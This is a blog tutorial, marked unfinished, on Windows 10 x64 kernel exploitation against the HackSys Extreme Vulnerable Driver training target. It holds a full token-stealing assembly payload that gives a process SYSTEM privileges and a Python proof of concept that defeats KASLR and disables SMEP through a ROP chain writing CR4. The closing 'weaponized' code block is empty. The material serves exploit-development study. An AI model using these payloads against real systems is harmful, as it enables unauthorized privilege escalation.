---
title: "Exploit Development: Panic! At The Kernel - Token Stealing Payloads Revisited on Windows 10 x64 and Bypassing SMEP (UNDER CONSTRUCTION)"
date:  2020-02-01
tags: [posts]
excerpt: "Revisiting token stealing payloads on Windows 10 x64 and diving into bypassing SMEP"
---
Introduction
---
Same ol' story with this blog post- I am trying to continue and further my research/overall knowledge on Windows kernel exploitation in order to prepare for [AWE](https://www.blackhat.com/us-20/training/schedule/index.html#advanced-windows-exploitation-19158), and to garner more experience with exploit development in general. Previously I have talked about [a](https://connormcgarr.github.io/Part-2-Kernel-Exploitation/) [couple](https://connormcgarr.github.io/Part-1-Kernel-Exploitation/) of vulnerability classes on Windows 7 x86, which is an OS with minimal protections. With this post, I wanted to take a deeper dive into token stealing payloads, which I have previously talked about on x86, and see what differences x64 might have. In addition, I wanted to try to do a better job of explaining how these payloads work. This post and research also aims to get myself more familiar with the x64 architecture, which is a far more common in 2020, and understand protections such as Supervisor Mode Execution Prevention (SMEP).

Gimme Dem Tokens!
---
As apart of Windows, there is something known as the SYSTEM process. The SYSTEM process, PID of 4, houses the majority of kernel mode system threads. The threads stored in the SYSTEM process, only run in context of kernel mode. Recall that a process is a "container" for threads. A thread is the actual item within a process that performs the execution of code. You may be asking "how does this help us?" Especially, if you did not see my last post. In Windows, each process object, known as `_EPROCESS`, has something known as an [access token](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens). This determines the security context of a process or a thread. Since the SYSTEM process houses execution of kernel mode code, it will need to run in a security context that allows it to access the kernel. This would require system or administrative privilege. This is why our goal will be to identify the access token value of the SYSTEM process and copy it to a process that we control, or the process we are using to exploit the system. From there, we can spawn `cmd.exe` from the now privileged process, which will grant us `NT AUTHORITY\SYSTEM` priviled code execution.

Identifying the SYSTEM Process Access Token
---
We will use Windows 10 x64 to outline this overall process. First, boot up WinDbg on your debugger machine and start kernel debugging you debuggee machine (see my [post](https://connormcgarr.github.io/Part-1-Kernel-Exploitation/) on setting up a debugging enviornment. In addition, I noticed on Windows 10, I had to execute the following command on my debugger machine after completing the `bcdedit.exe` commands: `bcdedit.exe /dbgsettings serial debugport:1 baudrate:115200`)

Once that is setup, execute the following command, to dump the process list:

`!process 0 0`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_1.png" alt="">

This returns a few elements of each process. We are most interested in the "Process address", which has been outlined in the image above at address `0xffffe60284651040`. Since we have enumerated that address, we can enumerate much more detailed information about the `_EPROCESS` structure of the SYSTEM process.

`dt nt!_EPROCESS <Process address>`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_2.png" alt="">

`dt` will display information about various variables, data types, etc. As you can see from the image above, various information about the SYSTEM process has been displayed. If you continue down the kd windows in WinDbg, you will see the `Token` element, at an offset of 0x358.

<img src="{{ site.url }}{{ site.baseurl }}/images/64_3.png" alt="">

What does this mean? That means for each process on Windows, the access token is located at an offset of 0x358. We will for sure be using this information later. Before moving on though, let's take a look at how the `Token` element is stored.

As you can see from the above image, there is something called `_EX_FAST_REF`, or an Executive Fast Reference union. The difference between a union and a structure, is that a union stores data types at the same memory location (notice there is no difference in offset of the elements of `_EX_FAST_REF` in the image below). This is what the access token of a process is stored in. Let's take a closer look at this structure.

`dt nt!_EX_FAST_REF`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_4.png" alt="">

Take a look at the `RefCnt` element. This is a value, appended to the access token, that keeps track of references of the access token. On x86, this is 3 bits. On x64 (which is our current architecture) this is 4 bits, as shown above. We want to clear these bits out, using logical AND. That way, we just extract the actual value of the `Token`, and not other unnecessary metadata.

To extract the value of the token, we simply need to view the `EX_FAST_REF` union of the SYSTEM process at an offset of 0x358 (which is where our token resides). From there, we can figure out how to go about clearing out `RefCnt`.

`dt nt!_EX_FAST_REF <Process address>+0x358`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_5.png" alt="">

As you can see, `RefCnt` is equal to 0y0111. 0y denotes a binary value. So this means `RefCnt` in this instance equals 7 in decimal.

So, let's use logical AND to try to clear out those last few bits.

`? TOKEN & 0xf`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_6.png" alt="">

As you can see, the result is 7. This is not the value we want- it is actually the inverse of it. Logic tells us, we should take the inverse of 0xf, -0xf.

<img src="{{ site.url }}{{ site.baseurl }}/images/64_7.png" alt="">

So- we have finally extracted the value of the raw access token. At this point, let's see what happens when we copy this token to a normal `cmd.exe` session.

Openenig a new `cmd.exe` process on the debuggee machine:

<img src="{{ site.url }}{{ site.baseurl }}/images/64_7_a.png" alt="">

After spawning a `cmd.exe` process on the debuggee, let's identify the process address in the debugger.

`!process 0 0 cmd.exe`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_8.png" alt="">

Now that we have the process address located at `0xffffe6028694d580` for `cmd.exe`. We also know, based on our research earlier, that the `Token` of a process is located at an offset of 0x358 from the process. Let's Use WinDbg to overwrite the `cmd.exe` access token with the access token of the SYSTEM process.

<img src="{{ site.url }}{{ site.baseurl }}/images/64_9.png" alt="">

Now, let's take a look back at our previous `cmd.exe` process.

<img src="{{ site.url }}{{ site.baseurl }}/images/64_10.png" alt="">

As you can see, `cmd.exe` has become a privileged process! Now the only question remains- how do we do this dynamically with a piece of shellcode?

Assembly? Who Needs It. I Will Never Need To Know That- It's Irrelevant
---

<img src="{{ site.url }}{{ site.baseurl }}/images/64_MEME1.png" alt="">

Small rant here- isn't it so funny the same ones who say exploit development is a waste of time and irrelevant are the same ones who will use Eternal Blue. ;)

Assembly will always hold a dear place in my heart, and I think everyone should at least know the fundementals and understand how powerful it is.

Anyways, let's develop an assembly program that can dynamically perform the above tasks in x64.

So let's start with this logic- we want to enumerate the current process. The current process during exploitation will be the process that triggers the vulnerability (the process where the exploit code is ran from). We want to get this process, because eventually we want to copy the SYSTEM access token to it. Let's do that

`PsGetCurrentProcessId()` is a Windows API function that identifies current thread and the process the thread resides in. This is identical to `IoGetCurrentProcess()`, and Microsoft recommends users to invoke `PsGetCurrentProgress()` instead. This function returns a pointer to the current PID's thread. Let's unassemble that function in WinDbg.

`uf nt!PsGetCurrentProcess`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_11.png" alt="">

Let's take a look at the first instruction `mov rax, qword ptr gs:[188h]`. As you can see, the GS segment register is in use here. This segment is a data segment, used to access different types of data structures. If you take a closer look at this segment, at an offset of 0x188 bytes, you will see `KiInitialThread`. This is a pointer to the `_KTHREAD` in the current threads `_ETHREAD` structure. The `_ETHREAD` structure is the thread object for a thread. `nt!KiInitialThread` is the address of this structure. Let's take a closer look

`dqs gs:[188h]`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_12.png" alt="">

This shows the GS segment register, at an offset of 0x188, holds an address of `0xffffd500e0c0cc00` (different on your machine because of ASLR/KASLR). This should be the `nt!KiInitialThread`, or the `ETHREAD` structure for the current thread. Let's verify this with WinDbg.

`!thread -p`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_13_a.png" alt="">

As you can see, we have verified that `nt!KiInitialThread` represents the address of the current thread.

Recall what was mentioned about threads and processes earlier. Threads are the part of a process that actually perform execution of code (for our purposes, these are kernel threads). Now that we have identified the current thread, let's identify the process associated with that thread (which would be the current process). Let's go back to the image above where we unassembled the `PSGetCurrentProcess()` function.

`mov rax, qword ptr [rax,0B8h]`

RAX alread contains the value of the GS segment register at an offset of 0x188 (which contains the current thread). The above assembly instruction will move the value of `nt!KiInitialThread + 0xB8` into RAX. Logic tells us this has to be the location of our current process, as the only instruction left in the `PsGetCurrentProcess()` routine is a `ret`. Let's investigate this further.

Since we believe this is going to be our current process, let's view this data in an `_EPROCESS` structure.

`dt nt!_EPROCESS poi(nt!KiInitialThread+0xb8)`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_41_a.png" alt="">

First, a little WinDbg kung-fu. `poi` essentially dereferences a pointer, which means obtaining the value a pointer points to.

And as you can see, we have found where our current proccess is! The PID for the current process at this time is the SYSTEM process (PID = 4). This is subject to change dependent on what is executing, etc. But, it is very important we are able to identify the current process.

Let's start building out an assembly program that tracks what we are doing.

```nasm
; Windows 10 x64 Token Stealing Payload
; Author Connor McGarr

[BITS 64]

_start:
	mov rax, [gs:0x188]		    ; Current thread (_KTHREAD)
	mov rax, [rax + 0xb8]	   	    ; Current process (_EPROCESS)
  	mov rbx, rax			    ; Copy current process (_EPROCESS) to rbx
```

Notice that I copied the current process, stored in RAX, into RBX as well. You will see why this is needed here shortly.

Take Me For A Loop!
---

Let's take a loop at a few more elements of the `_EPROCESS` structure.

`dt nt!_EPROCESS`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_15.png" alt="">

Let's take a look at the data type of `ActivePorcessLinks`, `_LIST_ENTRY`

`dt nt!_LIST_ENTRY`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_16.png" alt="">

This data type is a doubly linked list. This means that each element in the linked list not only points to the next element, but it also points to the previous one. Essentially, the elements point in each direction. This linked list is responsible for keeping track of all active processes.

There are two elements of `_EPROCESS` we need to keep track of. On Windows 10 x64, located at an offset of 0x2e0, `UniqueProcessId`. `ActiveProcessLinks` also needs to be kept track of, which is located at an offset 0x2e8.

So essentially what we can do in x64 assembly, is locate the current process. From there, we can iterate and loop through the `_EPROCESS` structure's `ActiveLinkProcess` element. After reading in the current `ActiveProcessLinks` element, we can compare the current `UniqueProcessId` (PID) to the constant 4, which is the PID of the SYSTEM process. Let's continue our already started assembly program.

```nasm
; Windows 10 x64 Token Stealing Payload
; Author Connor McGarr

[BITS 64]

_start:
	mov rax, [gs:0x188]		; Current thread (_KTHREAD)
	mov rax, [rax + 0xb8]	   	; Current process (_EPROCESS)
  	mov rbx, rax			; Copy current process (_EPROCESS) to rbx
	
__loop:
	mov rbx, [rbx + 0x2e8] 		; ActiveProcessLinks
	sub rbx, 0x2e8		   	; Go back to current process (_EPROCESS)
	mov rcx, [rbx + 0x2e0] 		; UniqueProcessId (PID)
	cmp rcx, 4 			; Compare PID to SYSTEM PID 
	jnz __loop			; Loop until SYSTEM PID is found
```

Once that SYSTEM `_EPROCESS` structure has been found, we can now go ahead and retrieve the token and copy it to our current process. This will unleash God mode on our current process. God, please have mercy on the soul of our poor little process.

<img src="{{ site.url }}{{ site.baseurl }}/images/Picture1.png" alt="">

Once we have found the SYSTEM process, remember that the `Token` element is located at an offset of 0x358 to the `_EPROCESS` structure of the process.

Let's finish out the rest of our token stealing payload for Windows 10 x64.

```nasm
; Windows 10 x64 Token Stealing Payload
; Author Connor McGarr

[BITS 64]

_start:
	mov rax, [gs:0x188]		; Current thread (_KTHREAD)
	mov rax, [rax + 0xb8]		; Current process (_EPROCESS)
	mov rbx, rax			; Copy current process (_EPROCESS) to rbx
__loop:
	mov rbx, [rbx + 0x2e8] 		; ActiveProcessLinks
	sub rbx, 0x2e8		   	; Go back to current process (_EPROCESS)
	mov rcx, [rbx + 0x2e0] 		; UniqueProcessId (PID)
	cmp rcx, 4 			; Compare PID to SYSTEM PID 
	jnz __loop			; Loop until SYSTEM PID is found

	mov rcx, [rbx + 0x358]		; SYSTEM token is @ offset _EPROCESS + 0x358
	and cl, 0xf0			; Clear out _EX_FAST_REF RefCnt
	mov [rax + 0x358], rcx		; Copy SYSTEM token to current process

	xor rax, rax			; set NTSTATUS SUCCESS
	ret				; Done!
```

Notice our use of logical AND. We are clearing out the last 4 bits of the RCX register, via the CL register.. If you have read my [post](https://connormcgarr.github.io/WS32_recv()-Reuse/) about a socket reuse exploit, you will know I talk about using the lower byte registers of the x86 or x64 registers (RCX, ECX, CX, CH, CL, etc).

As you can see also, we ended our shellcode by using logical XOR to clear out RAX. NTSTATUS uses RAX as the regsiter for the error code. NTSTATUS, when a value of 0 is returned, means the operations successfully performed.

Before we go ahead and show off our payload, let's develop an exploit that outlines bypassing SMEP. We will use a stack overflow as an example, in the kernel, to outline using [ROP](https://connormcgarr.github.io/ROP/) to bypass SMEP.

SMEP Says Hello
---

<img src="{{ site.url }}{{ site.baseurl }}/images/64_SMEP.png" alt="">

Let's talk about SMEP. SMEP, or Supervisor Mode Execution Prevention, is a protection that was started as apart of Windows 8. When we talk about executing code for a kernel exploit, the most common technique is to allocate the shellcode is user mode and the call that user mode address in the kernel. This means the user mode code will be called in context of the kernel, giving us the applicable privilege to obtain SYSTEM privileges.

SMEP is a prevention that does not allow us execute code stored in a ring 3 page from ring 0 (executing code from a higher ring in general). This means we cannot execute user mode code from kernel mode. In order to bypass SMEP, let's understand how it is implemented- as well as two techniques to bypass it.

The SMEP policy is enforced via the CR4 register. The CR4 register is a control register. Each bit in this register is responsible for various protection features being enabled on the OS. The 20th bit of the CR4 register is responsible for SMEP being enabled. If the 20th bit of the CR4 register is set to 1, SMEP is enabled. When the bit is set to 0, SMEP is disabled. Let's take a look at the CR4 register on Windows with SMEP enabled in normal hexadecimal format, as well as binary (so we can really see where that 20th bit resides).

`r cr4`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_17.png" alt="">

The CR4 register has a value of 0x00000000001506f8 in hexadecimal. Let's view that in binary, so we can see where the 20th bit resides.

`.formats cr4`

<img src="{{ site.url }}{{ site.baseurl }}/images/64_18.png" alt="">

As you can see, the 20th bit is outlined in the image above (counting from the right). Let's use the `.formats` command again to see what the value in the CR4 register needs to be, in order to bypass SMEP.

<img src="{{ site.url }}{{ site.baseurl }}/images/64_19.png" alt="">

As you can see from the above image, when the 20th bit of the CR4 register is flipped, the hexadecimal value would be 0x00000000000506f8.

Let's start with the first way to disable SMEP, with ROP.

ROP 'N Roll!
---
Let's use the an overflow for this. ROP assumes we have control over the stack (as each ROP gadget returns back to the stack). Since SMEP is enabled, our ROP gagdets will need to come from the kernel. Since we are assuming [medium integrity](https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625957(v=msdn.10)?redirectedfrom=MSDN) here, we can call `EnumDeviceDrivers()` to obtain the kernel base- which bypasses KASLR.

Essentially, here is how our ROP chain will work

```
-------------------
pop <reg> ; ret
-------------------
VALUE_WANTED_IN_CR4 (0x506f8) - This can be our own user supplied value.
-------------------
mov cr4, reg ; ret
-------------------
User mode payload address
-------------------
```

Let's go hunting for these ROP gadgets. Remember, these ROP gadgets need to be kernel mode addresses. We will use [rp++](https://github.com/0vercl0k/rp) to enumerate rop gadgets in `ntoskrnl.exe`. If you take a look at [my post](https://connormcgarr.github.io/ROP/) about ROP, you will see how to use this tool.

Let's figure out a way to control the contents of the CR4 register. Although we won't probably won't be able to directly manipulate the contents of the register directly, perhaps we can move the contents of a register that we can control into the CR4 register. Recall that a `pop <reg>` operation will take the contents of the next item on the stack, and store it in the register following the `pop` operation. Let's keep this in mind.

Using rp++, we have found a nice ROP gadget in `ntoskrnl.exe`, that allows us to store the contents of CR4 in the `ecx` register (the "second" 32-bits of the CR4 register.)

<img src="{{ site.url }}{{ site.baseurl }}/images/64_20_a.png" alt="">

As you can see, this ROP gadget is "located" at 0x140108552. However, since this is a kernel mode address- rp++ (from usermode and not ran as an administrator) will not give us the full address of this. However, if you remove the first 3 bytes, the rest of the "address" is really an offset from the kernel base. This means this ROP gadget is located at ntoskrnl.exe + 0x108552.

<img src="{{ site.url }}{{ site.baseurl }}/images/64_21_a.png" alt="">

Awesome! rp++ was a bit wrong in its enumeration. rp++ says that we can put ECX into the CR4 register. Howerver, upon further inspection, we can see this ROP gadget ACTUALLY points to a `mov cr4, rcx` instruction. This is perfect for our use case! We have a way to move the contents of the RCX register into the CR4 register. You may be asking "Okay, we can control the CR4 register via the RCX registger- but how does this help us"?. Recall the property of ROP from my previous post. Whenever we had a nice ROP gadget that allowed a desired intruction, but there was an unecessary `pop` in the gadget, we used filler data of NOPs. This is because we are just simply placing data in a register- we are not executing it.

The same principle applies here. If we can `pop` our intended flag value into ECX, we should have no problem. Here is the issue though. In `ntoskrnl.exe`, there is no direct `pop ecx, ret` ROP gadget. Instead, we will POP our value into RCX. RCX will contain a value of 0x506f8 (our intended CR4 register value). RCX has the ability to hold a piece of data that is 8 bytes long (0xffffffffffffffff). So, if we executed a `pop rcx` with our intended CR4 register value, RCX would contain 0x00000000000506f8.

Real quick with brevity- let's say rp++ was right, in that we could only control the contents of the ECX register (instead of RCX). How would this affect us?

Recall, however, how the registers work here.

```
-----------------------------------
               RCX
-----------------------------------
                       ECX
-----------------------------------
                             CX
-----------------------------------
                           CH    CL
-----------------------------------
```

This means, even though RCX contains 0x00000000000506f8, a `mov cr4, ecx` would take the lower 32-bits of RCX (which is ECX) and place it into the CR4 register. This would mean ECX would equal 0x000506f8- and that value would end up in CR4. So even though we are using both RCX and ECX, due to lack of `pop rcx` ROP gadgets, we will be unaffected!

Now, let's continue on to controlling the RCX register.

So let's find a `pop rcx` value!

<img src="{{ site.url }}{{ site.baseurl }}/images/64_22.png" alt="">

Nice! We have a ROP gadget located at ntoskrnl.exe + 0x3544. Let's update our POC with some breakpoints where our user mode shellcode will reside, top verify we can hit our shellcode. This POC takes care of the semantics such as finding the offset to the `ret` instruction we are overwriting, etc.

```python
import struct
import sys
import os
from ctypes import *

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi


payload = bytearray(
    "\xCC" * 50
)

# Defeating DEP with VirtualAlloc. Creating RWX memory, and copying our shellcode in that region.
# We also need to bypass SMEP before calling this shellcode
print "[+] Allocating RWX region for shellcode"
ptr = kernel32.VirtualAlloc(
    c_int(0),                         # lpAddress
    c_int(len(payload)),              # dwSize
    c_int(0x3000),                    # flAllocationType
    c_int(0x40)                       # flProtect
)

# Creates a ctype variant of the payload (from_buffer)
c_type_buffer = (c_char * len(payload)).from_buffer(payload)

print "[+] Copying shellcode to newly allocated RWX region"
kernel32.RtlMoveMemory(
    c_int(ptr),                       # Destination (pointer)
    c_type_buffer,                    # Source (pointer)
    c_int(len(payload))               # Length
)

# Need kernel leak to bypass KASLR
# Using Windows API to enumerate base addresses
# We need kernel mode ROP gadgets

# c_ulonglong because of x64 size (unsigned __int64)
base = (c_ulonglong * 1024)()

print "[+] Calling EnumDeviceDrivers()..."

get_drivers = psapi.EnumDeviceDrivers(
    byref(base),                      # lpImageBase (array that receives list of addresses)
    sizeof(base),                     # cb (size of lpImageBase array, in bytes)
    byref(c_long())                   # lpcbNeeded (bytes returned in the array)
)

# Error handling if function fails
if not base:
    print "[+] EnumDeviceDrivers() function call failed!"
    sys.exit(-1)

# The first entry in the array with device drivers is ntoskrnl base address
kernel_address = base[0]

print "[+] Found kernel leak!"
print "[+] ntoskrnl.exe base address: {0}".format(hex(kernel_address))

# Offset to ret overwrite
input_buffer = ("\x41" * 2056)

# SMEP says goodbye
print "[+] Starting ROP chain. Goodbye SMEP..."
input_buffer += struct.pack('<Q', kernel_address + 0x3544)      # pop rcx; ret

print "[+] Flipped SMEP bit to 0 in RCX..."
input_buffer += struct.pack('<Q', 0x506f8)           		# Intended CR4 value

print "[+] Placed disabled SMEP value in CR4..."
input_buffer += struct.pack('<Q', kernel_address + 0x108552)    # mov cr4, rcx ; ret

print "[+] SMEP disabled!"
input_buffer += struct.pack('<Q', ptr)                          # Location of user mode shellcode

# Crash the application
input_buffer += "\x90" * (4000 - len(input_buffer))

input_buffer_length = len(input_buffer)

# 0x222003 = IOCTL code that will jump to TriggerStackOverflow() function
# Getting handle to driver to return to DeviceIoControl() function
print "[+] Using CreateFileA() to obtain and return handle referencing the driver..."
handle = kernel32.CreateFileA(
    "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
    0xC0000000,                         # dwDesiredAccess
    0,                                  # dwShareMode
    None,                               # lpSecurityAttributes
    0x3,                                # dwCreationDisposition
    0,                                  # dwFlagsAndAttributes
    None                                # hTemplateFile
)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
print "[+] Interacting with the driver..."
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x222003,                           # dwIoControlCode
    input_buffer,                       # lpInBuffer
    input_buffer_length,                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)
```

Nice! As you can see, after our ROP gadgets are executed - we hit our breakpoints (placeholder for our shellcode to verify SMEP is disabled)!

<img src="{{ site.url }}{{ site.baseurl }}/images/64_23.png" alt="">

This means we have succesfully disabled SMEP, and we can execute usermode shellcode! Let's finalize this exploit with a working POC. Let's update our script with weaponized shellcode!

```python
```
